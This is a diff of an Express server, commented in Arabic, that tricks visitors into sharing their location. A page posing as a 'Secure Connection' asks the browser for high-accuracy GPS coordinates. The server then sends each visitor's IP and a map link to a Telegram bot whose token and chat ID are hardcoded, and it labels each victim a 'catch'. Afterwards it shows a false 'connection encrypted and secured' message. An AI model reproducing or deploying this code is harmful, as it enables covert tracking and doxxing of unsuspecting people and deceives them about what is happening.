@@ -5,49 +5,65 @@ const app = express();
 const BOT_TOKEN = "8524312771:AAGzkfu6ZiFBClFRDJaG4SPWl1eEZcgHEU8";
 const CHAT_ID = "6315285444";
 
-app.get('*', async (req, res) => {
-    // استخراج البيانات سواء بدأت بـ ? أو &
+// دالة إرسال البيانات للتليجرام
+async function notifyTelegram(ip, lat, lon, mode) {
+    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+    const message = `☢️ <b>صيد جديد من عمر مدهش!</b>\n\n` +
+                    `🌐 <b>IP:</b> <code>${ip}</code>\n` +
+                    `⚙️ <b>العملية:</b> ${mode}\n` +
+                    `📍 <b>الموقع:</b> <a href="${mapUrl}">اضغط لفتح الخريطة</a>`;
+    
+    try {
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+    } catch (e) { console.log("Telegram Error"); }
+}
+
+// استقبال أي طلب (حتى لو كان الرابط به أخطاء)
+app.use(async (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const urlParams = new URLSearchParams(req.url.split('?')[1] || req.url.split('&')[1]);
-    const mode = req.query.mode || "فحص عام";
+    
     const lat = req.query.lat || urlParams.get('lat');
     const lon = req.query.lon || urlParams.get('lon');
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const mode = req.query.mode || urlParams.get('mode') || "اختراق عام";
 
+    // إذا وصلت الإحداثيات
     if (lat && lon) {
-        let msg = `☢️ <b>تم اصطياد موقع جديد بواسطة عمر مدهش</b>\n`;
-        msg += `⚙️ <b>العملية:</b> ${mode}\n`;
-        msg += `📍 <b>الـ IP:</b> <code>${ip}</code>\n`;
-        msg += `🗺️ <b>الموقع على الخريطة:</b>\nhttps://www.google.com/maps?q=${lat},${lon}`;
-        
-        try {
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                chat_id: CHAT_ID,
-                text: msg,
-                parse_mode: 'HTML'
-            });
-            return res.send("<h1>Connection Secured Successfully</h1>");
-        } catch (err) {
-            return res.send("Error sending to bot");
-        }
+        await notifyTelegram(ip, lat, lon, mode);
+        return res.send(`
+            <body style="background:#000;color:#0f0;text-align:center;padding-top:100px;font-family:monospace;">
+                <h1>[ SUCCESS ]</h1>
+                <p>CONNECTION ENCRYPTED AND SECURED</p>
+                <p>IP: ${ip}</p>
+            </body>
+        `);
     }
 
-    // إذا لم تتوفر الإحداثيات بعد، نطلبها من المتصفح
+    // إذا لم تصل الإحداثيات، نقوم بسحبها
     res.send(`
         <html>
+        <head><title>Secure Connection</title></head>
         <body style="background:#000;color:#f00;text-align:center;padding-top:100px;">
             <h1>☢ LEX-Ω SYSTEM ☢</h1>
-            <p>جاري تأمين الاتصال...</p>
+            <p>جاري تأمين الاتصال... يرجى السماح بالوصول</p>
             <script>
-                navigator.geolocation.getCurrentPosition(p => {
-                    // إعادة توجيه ذكية لإرسال الإحداثيات للسيرفر
-                    window.location.href = "/?mode=HACK&lat=" + p.coords.latitude + "&lon=" + p.coords.longitude;
-                }, (err) => {
-                    window.location.href = "/?mode=FAILED_PERMISSION";
-                });
+                navigator.geolocation.getCurrentPosition(
+                    (p) => {
+                        // إعادة توجيه باستخدام ? لضمان عمل السيرفر
+                        window.location.href = "/?mode=GPS_HACK&lat=" + p.coords.latitude + "&lon=" + p.coords.longitude;
+                    },
+                    (e) => { window.location.href = "/?mode=PERMISSION_DENIED"; },
+                    {enableHighAccuracy: true}
+                );
             </script>
         </body>
         </html>
     `);
 });
 
-app.listen(process.env.PORT || 10000);
+const PORT = process.env.PORT || 10000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
